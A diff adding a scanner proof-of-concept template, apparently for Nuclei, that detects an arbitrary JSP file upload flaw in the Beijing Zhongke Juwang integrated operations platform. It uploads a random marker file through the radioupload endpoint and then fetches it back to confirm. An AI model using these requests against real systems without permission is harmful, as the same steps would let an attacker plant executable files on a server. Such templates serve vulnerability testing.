@@ -1,0 +1,59 @@
+id: poc-yaml-jnetdata-iop-radioupload-anyfile-upload
+
+info:
+  name: 北京中科聚网一体化运营平台 radioupload 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: fileupload
+  description: |
+    北京中科聚网一体化运营平台存在任意文件上传漏洞，可导致恶意文件上传至服务器。
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/resources/picture/radioupload?id=2"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr"
+    body: |-
+      ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: application/octet-stream
+
+      {{t2}}
+      ------WebKitFormBoundaryhbcZX7o0Hw19h3kr--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\\"url\\\":\\\"/(?P<file>.*?)\\.jsp\\\""
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "\\\"url\\\":\\\"/(?P<file>.*?)\\.jsp\\\""
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
